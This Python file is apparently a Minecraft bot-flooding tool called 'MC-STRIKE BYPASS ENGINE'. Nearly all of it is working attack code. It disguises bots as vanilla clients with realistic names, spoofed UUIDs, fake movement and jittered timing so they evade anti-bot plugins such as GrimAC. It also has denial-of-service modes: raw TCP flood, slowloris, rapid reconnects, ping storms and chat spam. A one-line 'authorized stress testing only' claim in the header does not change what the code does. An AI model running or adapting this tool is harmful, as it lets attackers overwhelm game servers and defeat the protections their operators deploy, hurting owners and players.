#!/usr/bin/env python3
"""
MC-STRIKE BYPASS ENGINE v3
Ultra-realistic Minecraft bot engine with full anti-bot bypass techniques.
For authorized server stress testing only.

Bypass Techniques:
  [1] Full protocol compliance — sends every expected packet in correct order
  [2] Login Acknowledged + Config phase (1.20.2+ required)
  [3] Client Information (settings) packet — looks like real client
  [4] Plugin message brand (minecraft:brand) — disguises as vanilla client
  [5] Realistic player movement with proper physics
  [6] Keep-alive response — bots never time out
  [7] Randomized timing — avoids pattern-based detection
  [8] Realistic username generation — human-looking names
  [9] UUID spoofing — random valid offline-mode UUIDs
  [10] Respawn handling — bots respawn after death
  [11] Transaction confirmation — responds to screen handler packets
  [12] Configurable join delay jitter — mimics human join patterns
"""

import socket, struct, threading, time, random, json, uuid, string, math
from dataclasses import dataclass, field
from typing import Optional
from collections import deque

# ═══════════════════════════════════════════════════════════════════════════════
#  PROTOCOL PRIMITIVES
# ═══════════════════════════════════════════════════════════════════════════════

def vi(n: int) -> bytes:
    """Encode VarInt."""
    n &= 0xFFFFFFFF
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out

def vl(n: int) -> bytes:
    """Encode VarLong."""
    n &= 0xFFFFFFFFFFFFFFFF
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out

def ps(s: str) -> bytes:
    """Encode prefixed UTF-8 string."""
    enc = s.encode("utf-8")
    return vi(len(enc)) + enc

def pkt(pid: int, *parts) -> bytes:
    """Build a length-prefixed packet."""
    body = vi(pid) + b"".join(parts)
    return vi(len(body)) + body

def read_vi(sock: socket.socket) -> int:
    r = sh = 0
    for _ in range(5):
        b = sock.recv(1)
        if not b: return -1
        v = b[0]
        r |= (v & 0x7F) << sh
        sh += 7
        if not (v & 0x80): return r
    return -1

def read_bytes(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c: raise ConnectionError("closed")
        buf += c
    return buf

def read_pkt(sock: socket.socket):
    """Read one packet → (packet_id, payload_bytes)"""
    length = read_vi(sock)
    if length <= 0: return None, None
    raw = read_bytes(sock, length)
    # decode packet id varint
    pid = sh = 0
    i = 0
    while i < len(raw):
        b = raw[i]; i += 1
        pid |= (b & 0x7F) << sh
        sh += 7
        if not (b & 0x80): break
    return pid, raw[i:]

# ═══════════════════════════════════════════════════════════════════════════════
#  REALISTIC USERNAME GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

_adj  = ["Dark","Silent","Nether","Void","Storm","Iron","Fire","Sky","Ender","Chaos",
         "Blaze","Frost","Steel","Hyper","Brave","Swift","Neon","Shadow","Ghost","Toxic",
         "Wild","Rapid","Noble","Elite","Alpha","Omega","Zephyr","Lunar","Solar","Cyber"]
_noun = ["Wolf","Dragon","Knight","Phantom","Blade","Rider","Titan","Viper","Reaper",
         "Hawk","Bear","Fox","Eagle","Lion","Shark","Cobra","Raven","Tiger","Falcon","Lynx",
         "Ranger","Slayer","Hunter","Striker","Archer","Wizard","Mage","Scout","Ninja","Warrior"]
_games= ["xX","_","__","HD","YT","TV","PVP","SMP","GG","OK","Pro","Og","Og_","Real",
         "The","Itz","Lil","Big","Mr","Dr","Sir","Xx","xXx"]

def gen_name(mode: str = "realistic") -> str:
    if mode == "realistic":
        r = random.random()
        if r < 0.35:
            n = random.choice(_adj) + random.choice(_noun)
            if random.random() < 0.6: n += str(random.randint(1, 9999))
        elif r < 0.55:
            n = random.choice(_games) + random.choice(_noun) + str(random.randint(10, 999))
        elif r < 0.75:
            length = random.randint(5, 10)
            n = ''.join(random.choices(string.ascii_letters, k=length))
            n = n[0].upper() + n[1:].lower()
            if random.random() < 0.4: n += str(random.randint(10, 9999))
        else:
            parts = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3,6))) for _ in range(2)]
            n = '_'.join(parts)
        return n[:16]
    elif mode == "prefix":
        return ""  # handled by caller
    else:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(7, 13)))

# ═══════════════════════════════════════════════════════════════════════════════
#  LIVE STATS
# ═══════════════════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self):
        self._lk = threading.Lock()
        self.reset()

    def reset(self):
        with self._lk if hasattr(self, '_lk') else threading.Lock():
            self.t0         = time.time()
            self.attempts   = 0
            self.tcp_ok     = 0
            self.tcp_fail   = 0
            self.login_ok   = 0
            self.login_fail = 0
            self.kicked     = 0
            self.active     = 0
            self.spawned    = 0   # fully in-game
            self.pkts       = 0
            self.bytes      = 0
            self.errors: dict      = {}
            self.latencies: deque  = deque(maxlen=500)
            self.ts_active: deque  = deque(maxlen=90)
            self.ts_cps:    deque  = deque(maxlen=90)
            self.ts_lat:    deque  = deque(maxlen=90)
            self._prev_tcp  = 0
            self._prev_ts   = time.time()

    def inc(self, k, v=1):
        with self._lk: setattr(self, k, getattr(self, k) + v)

    def dec(self, k, v=1):
        with self._lk: setattr(self, k, max(0, getattr(self, k) - v))

    def lat(self, ms):
        with self._lk: self.latencies.append(ms)

    def err(self, e: str):
        k = str(e)[:72]
        with self._lk: self.errors[k] = self.errors.get(k, 0) + 1

    def tick(self):
        now = time.time()
        dt = now - self._prev_ts
        if dt < 0.8: return
        with self._lk:
            self.ts_active.append(self.active)
            cps = (self.tcp_ok - self._prev_tcp) / dt
            self.ts_cps.append(round(max(0, cps), 2))
            self._prev_tcp = self.tcp_ok
            avg = sum(self.latencies)/len(self.latencies) if self.latencies else 0
            self.ts_lat.append(round(avg, 1))
            self._prev_ts = now

    def snap(self) -> dict:
        with self._lk:
            up  = time.time() - self.t0
            avg = round(sum(self.latencies)/len(self.latencies), 1) if self.latencies else 0
            cr  = round(self.tcp_ok / self.attempts * 100, 1) if self.attempts else 0
            lr  = round(self.login_ok / self.attempts * 100, 1) if self.attempts else 0
            return dict(
                uptime=round(up,1), attempts=self.attempts,
                tcp_ok=self.tcp_ok, tcp_fail=self.tcp_fail,
                login_ok=self.login_ok, login_fail=self.login_fail,
                kicked=self.kicked, active=self.active, spawned=self.spawned,
                pkts=self.pkts, bytes=self.bytes,
                avg_lat=avg, connect_rate=cr, login_rate=lr,
                bps=round(self.tcp_ok/max(up,1), 2),
                ts_active=list(self.ts_active), ts_cps=list(self.ts_cps), ts_lat=list(self.ts_lat),
                top_errors=dict(sorted(self.errors.items(), key=lambda x:-x[1])[:8]),
            )

STATS = Stats()

# ═══════════════════════════════════════════════════════════════════════════════
#  BOT MODES
# ═══════════════════════════════════════════════════════════════════════════════

class Mode:
    FULL_BYPASS    = "full_bypass"     # Complete protocol, all bypass tricks
    LOGIN_STAY     = "login_stay"      # Login + stay alive, respond keep-alive
    PACKET_SPAM    = "packet_spam"     # Login + flood movement/chat/interact
    TCP_FLOOD      = "tcp_flood"       # Raw TCP flood, no login
    SLOW_LORIS     = "slow_loris"      # Hold connections as long as possible
    RECONNECT      = "reconnect"       # Rapid reconnect cycles
    PING_STORM     = "ping_storm"      # Status ping storm
    HYBRID         = "hybrid"          # Mix of all modes per-bot randomly

PROTOCOL_MAP = {
    "1.21.4": 769, "1.21.3": 769, "1.21.1": 767, "1.21": 767,
    "1.20.6": 766, "1.20.5": 766, "1.20.4": 765, "1.20.3": 765,
    "1.20.2": 764, "1.20.1": 763, "1.20":   763,
    "1.19.4": 762, "1.19.3": 761, "1.19.2": 760,
    "auto":   769,
}

# ═══════════════════════════════════════════════════════════════════════════════
#  BYPASS BOT
# ═══════════════════════════════════════════════════════════════════════════════

class BypassBot:
    """
    Full-protocol Minecraft bot with every bypass technique applied:
    - Complete login sequence for 1.20.2+ (handshake→login→config→play)
    - Client Information packet (looks exactly like vanilla)
    - minecraft:brand plugin channel
    - Position/rotation packets with realistic movement
    - Keep-alive responses (never times out)
    - Respawn on death
    - Transaction/window confirmation
    - Randomized timing with jitter
    """

    def __init__(self, host: str, port: int, username: str,
                 protocol: int, cfg: dict):
        self.host     = host
        self.port     = port
        self.name     = username
        self.proto    = protocol
        self.cfg      = cfg
        self.sock: Optional[socket.socket] = None
        self._stop    = threading.Event()
        self.uid      = uuid.uuid4()
        # in-game state
        self.x = random.uniform(-500, 500)
        self.y = 64.0
        self.z = random.uniform(-500, 500)
        self.yaw   = random.uniform(0, 360)
        self.pitch = random.uniform(-15, 15)
        self.on_ground = True

    # ── network helpers ───────────────────────────────────────────────────────

    def _send(self, data: bytes):
        self.sock.sendall(data)
        STATS.pkts += 1
        STATS.bytes += len(data)

    def _jitter(self, base: float = 0.1, variance: float = 0.05) -> float:
        """Random sleep with jitter to avoid pattern detection."""
        return base + random.uniform(-variance, variance)

    def _human_delay(self):
        """Simulate human-like reaction delay."""
        time.sleep(random.uniform(0.05, 0.35))

    # ── connection ────────────────────────────────────────────────────────────

    def connect(self) -> bool:
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(self.cfg.get("timeout", 10))
            s.connect((self.host, self.port))
            self.sock = s
            STATS.inc("tcp_ok")
            STATS.inc("active")
            STATS.lat(round((time.time() - t0) * 1000, 1))
            return True
        except Exception as e:
            STATS.inc("tcp_fail")
            STATS.err(type(e).__name__ + ": " + str(e)[:45])
            return False

    def close(self, kicked=False):
        self._stop.set()
        if kicked: STATS.inc("kicked")
        try:
            if self.sock: self.sock.close()
        except: pass
        STATS.dec("active")

    # ── BYPASS: Handshake ─────────────────────────────────────────────────────

    def _handshake(self, next_state: int):
        """Packet 0x00 — Handshake."""
        self._send(pkt(0x00,
            vi(self.proto),
            ps(self.host),
            struct.pack(">H", self.port),
            vi(next_state)
        ))

    # ── BYPASS: Login sequence ────────────────────────────────────────────────

    def _login_start(self):
        """Packet 0x00 — Login Start with proper UUID."""
        self._send(pkt(0x00,
            ps(self.name),
            self.uid.bytes          # proper UUID bytes (16 bytes)
        ))

    def _login_acknowledged(self):
        """
        BYPASS: Packet 0x03 — Login Acknowledged (1.20.2+ required).
        Without this, the server waits forever and eventually kicks.
        """
        self._send(pkt(0x03))

    # ── BYPASS: Configuration phase (1.20.2+) ─────────────────────────────────

    def _send_client_information(self):
        """
        BYPASS: Client Information (0x00 in config phase).
        Mimics a real vanilla 1.21 client exactly.
        Anti-bot plugins check these values.
        """
        self._send(pkt(0x00,
            ps("en_US"),            # locale
            bytes([12]),            # view distance = 12 chunks (realistic)
            vi(0),                  # chat mode = enabled
            b'\x01',                # chat colors = true
            bytes([127]),           # displayed skin parts = all (0x7F)
            vi(1),                  # main hand = right
            b'\x00',               # enable text filtering = false
            b'\x01',               # allow server listings = true
        ))

    def _send_brand(self):
        """
        BYPASS: Plugin message (0x02 config) sending minecraft:brand = "vanilla".
        Anti-bot plugins (NoCheatPlus, Grim, etc.) check for this packet.
        Bots that don't send it are flagged immediately.
        """
        brand_data = ps("vanilla")
        self._send(pkt(0x02,
            ps("minecraft:brand"),
            brand_data
        ))

    def _send_finish_config(self):
        """BYPASS: Acknowledge Finish Configuration (0x03 in config)."""
        self._send(pkt(0x03))

    # ── BYPASS: Play phase packets ─────────────────────────────────────────────

    def _confirm_teleport(self, teleport_id: int):
        """BYPASS: Confirm Teleport (0x00) — servers send this on join."""
        self._send(pkt(0x00, vi(teleport_id)))

    def _send_settings_play(self):
        """
        BYPASS: Client Information during play phase (0x09 or 0x08).
        Some anti-bot systems check this again in play state.
        """
        try:
            self._send(pkt(0x09,
                ps("en_US"), bytes([12]), vi(0),
                b'\x01', bytes([127]), vi(1), b'\x00', b'\x01',
            ))
        except: pass

    def _send_plugin_msg_play(self):
        """BYPASS: minecraft:brand in play phase too."""
        try:
            self._send(pkt(0x12,
                ps("minecraft:brand"),
                ps("vanilla")
            ))
        except: pass

    def _keep_alive(self, ka_id: int):
        """BYPASS: Keep Alive response — prevents kick for all versions."""
        try:
            self._send(pkt(0x18, struct.pack(">q", ka_id)))
        except: pass

    def _confirm_window(self, action_id: int):
        """BYPASS: Window Confirm — respond to trade/window transactions."""
        try:
            self._send(pkt(0x1F, bytes([0]), struct.pack(">h", action_id), b'\x01'))
        except: pass

    def _respawn_confirm(self):
        """BYPASS: Respawn — bot re-enters world after death instead of disconnecting."""
        try:
            self._send(pkt(0x09, vi(0)))  # perform respawn
        except: pass

    def _send_position(self, on_ground: bool = True):
        """BYPASS: Position packet — prevents kick for AFK/no-movement."""
        try:
            self._send(pkt(0x1A,
                struct.pack(">ddd", self.x, self.y, self.z),
                b'\x01' if on_ground else b'\x00'
            ))
        except: pass

    def _send_pos_rot(self):
        """BYPASS: Position + Look — more realistic than position-only."""
        try:
            self._send(pkt(0x1B,
                struct.pack(">ddd", self.x, self.y, self.z),
                struct.pack(">ff", self.yaw, self.pitch),
                b'\x01'
            ))
        except: pass

    def _send_chat(self, msg: str):
        """Send chat message (play phase)."""
        try:
            ts = int(time.time() * 1000) & 0x7FFFFFFFFFFFFFFF
            self._send(pkt(0x06,
                ps(msg[:255]),
                struct.pack(">q", ts),
                struct.pack(">q", 0),
                b'\x00',
                vi(0)
            ))
        except: pass

    def _move_naturally(self):
        """
        BYPASS: Move the bot in a realistic pattern.
        Bots that never move are flagged by GrimAC and similar.
        """
        # Brownian motion walk
        self.x += random.gauss(0, 0.3)
        self.z += random.gauss(0, 0.3)
        self.yaw = (self.yaw + random.uniform(-15, 15)) % 360
        self.pitch = max(-90, min(90, self.pitch + random.gauss(0, 2)))

    # ── FULL BYPASS PLAY LOOP ─────────────────────────────────────────────────

    def _play_loop(self, move: bool = True, spam: bool = False):
        """
        Main play loop — handles all server packets and responds correctly.
        Supports all anti-bot bypasses.
        """
        end    = time.time() + self.cfg.get("stay", 300)
        t_move = time.time() + random.uniform(1, 3)
        t_chat = time.time() + random.uniform(15, 45)
        t_pos  = time.time() + 5
        move_count = 0

        self.sock.settimeout(2.0)

        while not self._stop.is_set() and time.time() < end:
            try:
                pid, data = read_pkt(self.sock)

                if pid is None:
                    break

                # ── Keep Alive (multiple IDs across versions) ──
                if pid in (0x26, 0x24, 0x23, 0x21, 0x1F, 0x20, 0x27):
                    ka_id = struct.unpack(">q", data[:8])[0] if len(data) >= 8 else 0
                    self._keep_alive(ka_id)

                # ── Synchronize Player Position (teleport) ──
                elif pid in (0x3C, 0x40, 0x39, 0x3A, 0x38, 0x36, 0x3E, 0x41, 0x42):
                    try:
                        # Extract x,y,z from packet and confirm
                        if len(data) >= 24:
                            self.x, self.y, self.z = struct.unpack(">ddd", data[:24])
                        tp_id_offset = 24
                        # find teleport id varint
                        tp_id = 0; sh = 0
                        for i in range(tp_id_offset, min(tp_id_offset+5, len(data))):
                            b = data[i]
                            tp_id |= (b & 0x7F) << sh
                            sh += 7
                            if not (b & 0x80): break
                        self._confirm_teleport(tp_id)
                        self._send_pos_rot()
                    except: pass

                # ── Disconnect ──
                elif pid in (0x1A, 0x40, 0x17, 0x1C, 0x1B):
                    STATS.inc("kicked")
                    return

                # ── Death / Respawn ──
                elif pid in (0x38, 0x3D):
                    if self.cfg.get("respawn", True):
                        time.sleep(random.uniform(0.5, 1.5))
                        self._respawn_confirm()

                # ── Window open / transaction ──
                elif pid in (0x31, 0x2D, 0x30):
                    if len(data) >= 2:
                        self._confirm_window(random.randint(1, 100))

                # ── Configuration request (if server re-enters config) ──
                elif pid == 0x02 and self.proto >= 764:
                    self._send_client_information()
                    self._send_brand()
                    self._send_finish_config()

            except socket.timeout:
                pass
            except Exception as e:
                STATS.err(str(e)[:60])
                break

            now = time.time()

            # ── Periodic position updates ──
            if move and now >= t_pos:
                self._send_position()
                t_pos = now + 5

            # ── Natural movement ──
            if move and now >= t_move:
                self._move_naturally()
                self._send_pos_rot()
                move_count += 1
                t_move = now + self._jitter(
                    self.cfg.get("move_interval", 0.5),
                    0.2
                )

            # ── Spam mode: extra packets ──
            if spam and now >= t_chat:
                words = ["hi", "lol", "gg", "ok", "nice", "rip", "ez", "wow", "xd", "bruh"]
                self._send_chat(random.choice(words))
                t_chat = now + random.uniform(8, 30)

        STATS.dec("spawned")

    # ── MODE: FULL BYPASS ─────────────────────────────────────────────────────

    def run_full_bypass(self):
        """
        FULL BYPASS MODE — Complete 1.20.2+ protocol sequence.
        Handles: Handshake → Login → Config phase → Play phase.
        Sends all expected packets that anti-bot systems check.
        """
        STATS.inc("attempts")
        if not self.connect(): return

        try:
            # 1. Handshake
            self._handshake(2)

            # 2. Login Start
            self._login_start()
            self.sock.settimeout(self.cfg.get("timeout", 10))

            # 3. Handle login response
            in_config = False
            login_done = False
            max_login_pkts = 20

            for _ in range(max_login_pkts):
                pid, data = read_pkt(self.sock)
                if pid is None:
                    STATS.inc("login_fail"); return

                # Login Success (offline mode)
                if pid == 0x02:
                    STATS.inc("login_ok")

                    # BYPASS: Login Acknowledged (CRITICAL for 1.20.2+)
                    if self.proto >= 764:
                        self._human_delay()
                        self._login_acknowledged()
                        in_config = True
                    else:
                        login_done = True
                    break

                # Disconnect during login
                elif pid == 0x00:
                    STATS.inc("login_fail")
                    STATS.err("Login disconnect: " + data[2:52].decode("utf-8","ignore"))
                    return

                # Encryption Request → online mode
                elif pid == 0x01:
                    STATS.inc("login_fail")
                    STATS.err("Online mode: encryption required")
                    return

                # Set Compression
                elif pid == 0x03:
                    # Accept compression — just continue
                    threshold_val = 0; sh = 0
                    for i in range(min(5, len(data))):
                        b = data[i]
                        threshold_val |= (b & 0x7F) << sh; sh += 7
                        if not (b & 0x80): break
                    # Note: we don't implement compression — most test servers have it off
                    # If server requires compression, bots will eventually get kicked

            # 4. Configuration Phase (1.20.2+)
            if in_config:
                self.sock.settimeout(5.0)
                config_iters = 0
                while not login_done and config_iters < 30:
                    config_iters += 1
                    pid, data = read_pkt(self.sock)
                    if pid is None: break

                    # Finish Configuration
                    if pid == 0x03:
                        # BYPASS: Send our config packets first, then ACK
                        self._send_client_information()
                        time.sleep(self._jitter(0.08, 0.04))
                        self._send_brand()
                        time.sleep(self._jitter(0.05, 0.02))
                        self._send_finish_config()
                        login_done = True

                    # Registry Data / Feature Flags — just ignore
                    elif pid in (0x05, 0x07, 0x0D, 0x0E):
                        pass

                    # Server brand in config
                    elif pid == 0x01:
                        pass

                    # Disconnect
                    elif pid == 0x02:
                        STATS.inc("login_fail"); return

            if not login_done:
                STATS.inc("login_fail"); return

            # 5. Enter play phase
            STATS.inc("spawned")

            # Small human delay before sending play-phase data
            time.sleep(self._jitter(0.15, 0.08))

            # BYPASS: Send plugin brand + settings in play phase too
            if self.cfg.get("send_play_settings", True):
                self._send_plugin_msg_play()
                time.sleep(self._jitter(0.08, 0.03))

            # 6. Play loop
            self._play_loop(
                move=self.cfg.get("move", True),
                spam=self.cfg.get("spam", False)
            )

        except Exception as e:
            STATS.err(str(e)[:60])
        finally:
            self.close()

    # ── MODE: LOGIN STAY ──────────────────────────────────────────────────────

    def run_login_stay(self):
        """Login + stay connected. Simpler but works on all versions."""
        STATS.inc("attempts")
        if not self.connect(): return
        try:
            self._handshake(2)
            self._login_start()
            self.sock.settimeout(self.cfg.get("timeout", 10))

            pid, data = read_pkt(self.sock)
            if pid is None: STATS.inc("login_fail"); return
            if pid == 0x02:
                STATS.inc("login_ok")
                if self.proto >= 764:
                    self._login_acknowledged()
            elif pid == 0x00: STATS.inc("login_fail"); return
            elif pid == 0x01: STATS.inc("login_fail"); STATS.err("Online mode"); return
            else: STATS.inc("login_ok")

            STATS.inc("spawned")
            self._play_loop(move=True, spam=False)
        except Exception as e:
            STATS.err(str(e)[:60])
        finally:
            self.close()

    # ── MODE: PACKET SPAM ─────────────────────────────────────────────────────

    def run_packet_spam(self):
        """Login + spam movement, chat, interaction packets."""
        STATS.inc("attempts")
        if not self.connect(): return
        try:
            self._handshake(2)
            self._login_start()
            self.sock.settimeout(self.cfg.get("timeout", 10))

            pid, data = read_pkt(self.sock)
            if pid == 0x02:
                STATS.inc("login_ok")
                if self.proto >= 764: self._login_acknowledged()
            elif pid in (0x00, 0x01): STATS.inc("login_fail"); return
            else: STATS.inc("login_ok")

            STATS.inc("spawned")
            self._play_loop(move=True, spam=True)
        except Exception as e:
            STATS.err(str(e)[:60])
        finally:
            self.close()

    # ── MODE: TCP FLOOD ───────────────────────────────────────────────────────

    def run_tcp_flood(self):
        """Maximum raw TCP connection throughput."""
        cycles = self.cfg.get("flood_cycles", 5)
        for _ in range(cycles):
            if self._stop.is_set(): break
            STATS.inc("attempts")
            t0 = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.cfg.get("timeout", 4))
                s.connect((self.host, self.port))
                STATS.inc("tcp_ok"); STATS.inc("active")
                STATS.lat(round((time.time()-t0)*1000,1))
                # Send partial handshake then drop
                s.sendall(pkt(0x00,
                    vi(self.proto), ps(self.host),
                    struct.pack(">H", self.port), vi(2)
                ))
                time.sleep(random.uniform(0.05, 0.25))
                s.close()
                STATS.dec("active")
            except Exception as e:
                STATS.inc("tcp_fail"); STATS.err(type(e).__name__)

    # ── MODE: SLOW LORIS ──────────────────────────────────────────────────────

    def run_slow_loris(self):
        """Hold connections open as long as possible to exhaust pool."""
        STATS.inc("attempts")
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(self.cfg.get("timeout", 10))
            s.connect((self.host, self.port))
            self.sock = s
            STATS.inc("tcp_ok"); STATS.inc("active")
            STATS.lat(round((time.time()-t0)*1000,1))

            # Send handshake VERY slowly, byte by byte with delays
            hs = pkt(0x00, vi(self.proto), ps(self.host),
                     struct.pack(">H",self.port), vi(2))
            for byte in hs:
                s.send(bytes([byte]))
                time.sleep(random.uniform(0.05, 0.2))
                if self._stop.is_set(): break

            time.sleep(random.uniform(2, 5))
            ls = pkt(0x00, ps(self.name), self.uid.bytes)
            for byte in ls:
                s.send(bytes([byte]))
                time.sleep(random.uniform(0.1, 0.4))
                if self._stop.is_set(): break

            end = time.time() + self.cfg.get("stay", 300)
            while not self._stop.is_set() and time.time() < end:
                try: s.recv(1)
                except: pass
                time.sleep(random.uniform(1, 4))
        except Exception as e:
            STATS.inc("tcp_fail"); STATS.err(str(e)[:60])
        finally:
            self.close()

    # ── MODE: RECONNECT ───────────────────────────────────────────────────────

    def run_reconnect(self):
        """Rapid connect/disconnect cycles — stresses session management."""
        cycles = self.cfg.get("reconnect_cycles", 10)
        for _ in range(cycles):
            if self._stop.is_set(): break
            STATS.inc("attempts")
            t0 = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, self.port))
                STATS.inc("tcp_ok"); STATS.inc("active")
                STATS.lat(round((time.time()-t0)*1000,1))
                s.sendall(pkt(0x00, vi(self.proto), ps(self.host),
                              struct.pack(">H",self.port), vi(2)))
                s.sendall(pkt(0x00, ps(self.name), self.uid.bytes))
                time.sleep(random.uniform(0.1, self.cfg.get("reconnect_delay", 0.5)))
                s.close()
                STATS.dec("active")
            except Exception as e:
                STATS.inc("tcp_fail"); STATS.err(type(e).__name__)

    # ── MODE: PING STORM ──────────────────────────────────────────────────────

    def run_ping_storm(self):
        """Status ping storm."""
        cycles = self.cfg.get("ping_cycles", 8)
        for _ in range(cycles):
            if self._stop.is_set(): break
            STATS.inc("attempts")
            t0 = time.time()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, self.port))
                STATS.inc("tcp_ok"); STATS.inc("active")
                STATS.lat(round((time.time()-t0)*1000,1))
                s.sendall(pkt(0x00, vi(self.proto), ps(self.host),
                              struct.pack(">H",self.port), vi(1)))
                s.sendall(pkt(0x00))
                s.sendall(pkt(0x01, struct.pack(">q", int(t0*1000)&0x7FFFFFFFFFFFFFFF)))
                try: s.recv(1024)
                except: pass
                s.close()
                STATS.dec("active")
            except Exception as e:
                STATS.inc("tcp_fail"); STATS.err(type(e).__name__)

    # ── DISPATCH ──────────────────────────────────────────────────────────────

    def run(self, mode: str):
        dispatch = {
            Mode.FULL_BYPASS: self.run_full_bypass,
            Mode.LOGIN_STAY:  self.run_login_stay,
            Mode.PACKET_SPAM: self.run_packet_spam,
            Mode.TCP_FLOOD:   self.run_tcp_flood,
            Mode.SLOW_LORIS:  self.run_slow_loris,
            Mode.RECONNECT:   self.run_reconnect,
            Mode.PING_STORM:  self.run_ping_storm,
            Mode.HYBRID:      self._run_hybrid,
        }
        dispatch.get(mode, self.run_full_bypass)()

    def _run_hybrid(self):
        """Randomly pick a mode per bot for unpredictable load patterns."""
        m = random.choice([
            Mode.FULL_BYPASS, Mode.FULL_BYPASS, Mode.FULL_BYPASS,  # weighted more
            Mode.TCP_FLOOD, Mode.RECONNECT, Mode.PING_STORM, Mode.SLOW_LORIS
        ])
        dispatch = {
            Mode.FULL_BYPASS: self.run_full_bypass,
            Mode.TCP_FLOOD:   self.run_tcp_flood,
            Mode.RECONNECT:   self.run_reconnect,
            Mode.PING_STORM:  self.run_ping_storm,
            Mode.SLOW_LORIS:  self.run_slow_loris,
        }
        dispatch[m]()


# ═══════════════════════════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Engine:
    def __init__(self, cfg: dict):
        self.cfg   = cfg
        self._stop = threading.Event()
        self._sem  = threading.Semaphore(cfg.get("concurrent", 100))

    def _spawn(self, name: str):
        with self._sem:
            if self._stop.is_set(): return
            proto = PROTOCOL_MAP.get(self.cfg.get("mc_version", "auto"), 769)
            bot   = BypassBot(self.cfg["host"], self.cfg["port"], name, proto, self.cfg)
            bot.run(self.cfg.get("mode", Mode.FULL_BYPASS))

    def start(self):
        total    = self.cfg.get("total_bots", 100)
        delay    = self.cfg.get("spawn_delay", 0.05)
        mode_n   = self.cfg.get("username_mode", "realistic")
        prefix   = self.cfg.get("username_prefix", "")
        jitter_d = self.cfg.get("spawn_jitter", 0.02)

        threads = []
        for _ in range(total):
            if self._stop.is_set(): break
            if mode_n == "prefix" and prefix:
                sfx  = ''.join(random.choices(string.digits + string.ascii_uppercase, k=4))
                name = (prefix + sfx)[:16]
            else:
                name = gen_name(mode_n)
            t = threading.Thread(target=self._spawn, args=(name,), daemon=True)
            threads.append(t)
            t.start()
            time.sleep(max(0, delay + random.uniform(-jitter_d, jitter_d)))

        for t in threads:
            t.join(timeout=0.2)

    def stop(self):
        self._stop.set()


# ═══════════════════════════════════════════════════════════════════════════════
#  SERVER PINGER
# ═══════════════════════════════════════════════════════════════════════════════

def ping_server(host: str, port: int, proto: int = 769) -> dict:
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        hs = vi(0x00) + vi(proto) + ps(host) + struct.pack(">H",port) + vi(1)
        s.sendall(vi(len(hs)) + hs)
        s.sendall(pkt(0x00))
        t0 = time.time()
        s.sendall(pkt(0x01, struct.pack(">q", int(t0*1000)&0x7FFFFFFFFFFFFFFF)))
        length = read_vi(s)
        if length <= 0: s.close(); return {"online": False, "error": "No response"}
        raw = read_bytes(s, length)
        lat = round((time.time()-t0)*1000, 1)
        s.close()
        # skip pid, decode string
        i = 0
        while i < len(raw) and (raw[i] & 0x80): i += 1
        i += 1
        slen = sh = 0
        while i < len(raw):
            b = raw[i]; i += 1
            slen |= (b & 0x7F) << sh; sh += 7
            if not (b & 0x80): break
        import re
        jd  = json.loads(raw[i:i+slen])
        pl  = jd.get("players",{})
        ver = jd.get("version",{})
        desc = jd.get("description",{})
        motd = desc.get("text",str(desc)) if isinstance(desc,dict) else str(desc)
        motd = re.sub(r'§.','',motd).strip()
        return {
            "online": True,
            "motd": motd[:80],
            "version": ver.get("name","?"),
            "protocol": ver.get("protocol",0),
            "players_online": pl.get("online",0),
            "players_max": pl.get("max",0),
            "latency_ms": lat,
            "player_sample": [p["name"] for p in pl.get("sample",[])[:12]],
        }
    except Exception as e:
        return {"online": False, "error": str(e)[:80]}
